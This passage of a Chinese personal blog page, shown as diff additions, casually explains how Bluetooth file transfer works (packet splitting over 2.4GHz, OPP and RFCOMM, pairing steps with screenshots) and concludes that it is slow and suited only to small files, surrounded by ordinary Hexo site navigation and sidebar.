+<p>真要传文件的时候，不管是图片、文档还是歌，系统都会自动把整个文件拆成一小段一小段的小数据包，就像把一大箱东西分成小包裹挨个寄。然后通过2.4GHz的无线电波，一点点把这些小数据包发过去，另一边的设备收到所有小包裹，再自动拼回完整的文件，存到手机里，传输就完成了。就和那早年间下载器加速下载差不多，切割文件，传输，再合起来，但是，他不像下载器一样，可以同时下载好几个，就死死的一点点的传，所以很慢。</p>
+<p>蓝牙是近距离传输，基本上要面对面传，就这，传的都慢的要死，照片都不能秒传，所以基本上不建议用，就你看哪个搞传输文件的用到了蓝牙去传，基本上就是连接设备吧，传输基本上就是用网络吧，所以这里是用于一些极端情况。</p>
+<p>另外，蓝牙用的2.4GHz频段，跟家里WiFi、微波炉挨得近，会互相干扰，传文件突然卡顿，多半是这个原因。但是，配对传输的时候还有加密，对，我查资料的时候也很吃惊，所以安全性也够用，</p>
+<p>简单说就是，蓝牙就是近距离、低功耗的无线隔空传文件，先配对建通道，再把文件拆分传输、接收重组，适合临时传小文件，方便又不用依赖网络。但是千万千万不要传大文件，不然那传输速度会让你怀疑人生，当热，你可以体会一下，当初哪些说网速慢，就和现在蓝牙传文件的速度差不多，可能还要慢点。</p>
+<p>然后就是传输协议是OPP对象推送协议（推送）和RFCOMM协议（传输通道），具体的自己去查，毕竟我不可能帮你把协议上的东西都给你介绍清楚吧，反正知道他是一个推送一个搞通道的就行。</p>
+<p><strong><em>2、连接</em></strong></p>
+<p>注意现在基本上都有蓝牙模块的，但是有些可能也没有，所以还是要提醒大家看看有没有蓝牙在东西。</p>
+<p>（1）开启蓝牙（那图标你不可能都不认识吧）</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-22-212559.png"></p>
+<p>这东西啊，手机上一样</p>
+<p>（2）配对设备（两边同时开启然后配对就行）</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-205714.png"></p>
+<p>这里我是没有联网的</p>
+<p>（3）传输文件</p>
+<p>就手机上和电脑上这样传输文件就行</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-205819-1024x855.png"></p>
+<p><img src="/images/98d5201e42c3e4067d98e9afca82ac47-461x1024.jpg"></p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-210000-1024x843.png"></p>
+<p>额，看吧，就这照片都要传半天，而且中间还会断连，额，真的不是很推荐。</p>
+<p>总结：这种就是用于没网急用，传小文件，你就当听个乐，实际上用的真的不多，但是好像又有点用的知识吧。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/04/23/2026/04/2026-04-23-%E8%93%9D%E7%89%99%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6/index/" data-id="cuid985DasIaqJTh24mi3UOE9" data-title="蓝牙传输文件" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ai/">ai</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python%E6%95%99%E7%A8%8B/">python教程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86/">其他知识</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/">开源项目</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%89%8B%E6%9C%BA%E7%9F%A5%E8%AF%86/">手机知识</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%97%A5%E8%AE%B0/">日记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9F%A5%E8%AF%86/">服务器知识</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%B8%E6%88%8F/">游戏</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%94%B5%E8%84%91%E7%9F%A5%E8%AF%86/">电脑知识</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/05/">May 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/04/">April 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/03/">March 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/05/25/2026/05/2026-05-25-%E5%88%A9%E7%94%A8pe%E4%BF%AE%E6%94%B9windows%E7%94%B5%E8%84%91%E5%BC%80%E6%9C%BA%E5%AF%86%E7%A0%81/index/">利用pe修改windows电脑开机密码</a>
+          </li>
+        
+          <li>
+            <a href="/2026/05/24/2026/05/2026-05-24-ce%E4%BF%AE%E6%94%B9%E5%99%A8%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/index/">CE修改器使用指南</a>
+          </li>
+        
+          <li>
+            <a href="/2026/05/23/2026/05/2026-05-23-%E5%85%B3%E4%BA%8E%E9%A9%B1%E5%8A%A8/index/">关于驱动</a>
+          </li>
+        
+          <li>
+            <a href="/2026/05/22/2026/05/2026-05-22-python-%E6%89%93%E5%8C%85%E5%99%A8-gui/index/">Python 打包器 (GUI)</a>
+          </li>
+        
+          <li>
+            <a href="/2026/05/21/2026/05/2026-05-21-%E5%85%B3%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E9%80%89%E7%94%A8/index/">关于操作系统的选用</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
